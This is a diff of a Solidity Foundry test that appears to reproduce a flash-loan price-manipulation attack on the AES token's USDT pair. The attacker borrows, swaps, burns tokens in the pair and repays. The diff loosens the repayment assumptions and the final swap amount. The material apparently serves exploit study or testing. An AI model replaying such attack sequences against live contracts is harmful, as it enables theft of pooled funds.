@@ -206,7 +206,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt5
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 >= (amt0 * 1003) / 1000);
+        vm.assume(amt5 >= amt0);
         borrow_usdt_owner(amt0);
         swap_pair_attacker_usdt_aes(amt1, amt2);
         swap_pair_attacker_aes_usdt(amt3, amt4);
@@ -225,7 +225,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt6
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 >= (amt0 * 1003) / 1000);
+        vm.assume(amt6 >= amt0);
         borrow_usdt_owner(amt0);
         swap_pair_attacker_usdt_aes(amt1, amt2);
         burn_aes_pair(amt3);
@@ -248,7 +248,7 @@ contract AESTest is Test, BlockLoader {
         printBalance("After step2 ");
         swap_pair_attacker_aes_usdt(
             aes.balanceOf(attacker),
-            pair.getAmountOut(aes.balanceOf(attacker), address(aes))
+            (pair.getAmountOut(aes.balanceOf(attacker), address(aes)) * 9) / 10
         );
         printBalance("After step3 ");
         payback_usdt_owner((100000e18 * 1003) / 1000);
@@ -267,7 +267,7 @@ contract AESTest is Test, BlockLoader {
         uint256 amt6
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 >= (amt0 * 1003) / 1000);
+        vm.assume(amt6 >= amt0);
         borrow_usdt_owner(amt0);
         swap_pair_attacker_usdt_aes(amt1, amt2);
         burn_aes_pair(amt3);
